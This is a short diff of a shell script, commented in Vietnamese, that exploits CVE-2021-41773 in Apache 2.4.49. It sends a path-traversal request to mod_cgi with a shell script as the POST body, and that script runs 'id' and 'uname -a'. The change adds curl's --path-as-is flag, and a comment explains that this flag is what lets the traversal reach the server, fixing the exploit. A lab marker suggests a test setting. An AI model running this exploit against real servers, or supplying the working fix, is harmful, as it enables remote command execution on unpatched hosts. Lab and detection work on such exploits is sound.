@@ -18,7 +18,9 @@ echo "[*] V2 / CVE-2021-41773 (mod_cgi exec) → $BASE$TRAV"
 echo "[*] Lệnh recon lành tính: 'id' (sinh httpd -> sh -> id)"
 
 # POST body là script sh; Apache 2.4.49 + mod_cgi thực thi qua /bin/sh.
-curl -s "$BASE$TRAV" \
+# --path-as-is BẮT BUỘC: thiếu nó, curl tự collapse '.%2e/../' phía client → server nhận
+# path đã chuẩn hoá → 404, traversal không bao giờ tới server (bug gốc của bản cũ).
+curl -s --path-as-is "$BASE$TRAV" \
      -H "Content-Type: text/plain" \
      --data 'echo; echo "== V2 lab marker =="; id; uname -a; echo "== end =="' \
   | sed 's/^/    /' || true
